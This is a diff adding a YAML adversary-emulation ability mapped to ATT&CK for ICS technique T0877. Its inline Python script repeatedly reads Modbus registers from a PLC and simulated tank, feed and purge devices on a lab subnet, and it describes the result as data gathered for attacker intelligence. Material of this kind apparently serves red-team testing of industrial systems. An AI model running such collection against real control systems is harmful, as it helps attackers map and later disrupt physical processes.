@@ -1,0 +1,32 @@
+---
+
+- id: e5f6a7b8-5555-5555-5555-000000000003
+  name: Scripted Automated I/O Image Collection
+  description: |
+    Python script that continuously reads all I/O registers from
+    the PLC and simulation devices every 5 seconds, building a
+    process historian-style dataset for attacker intelligence.
+  tactic: collection
+  technique_id: T0877
+  technique_name: I/O Image
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      python3 -c "
+      import subprocess, time, json
+      targets = [
+        ('192.168.95.2', 'PLC', 'read_ir', '100', '13'),
+        ('192.168.95.14', 'Tank', 'read_ir', '1', '2'),
+        ('192.168.95.10', 'Feed1', 'read_hr', '1', '1'),
+        ('192.168.95.12', 'Purge', 'read_hr', '1', '1'),
+      ]
+      for cycle in range(5):
+          ts = time.strftime('%H:%M:%S')
+          for ip, name, cmd, start, count in targets:
+              r = subprocess.run(['./modbus_cli', ip, '--port', '502', cmd, start, count],
+                  capture_output=True, text=True, timeout=5)
+              print(f'[{ts}] {name}({ip}): {r.stdout.strip()}')
+          time.sleep(5)
+      "
+    timeout: 120
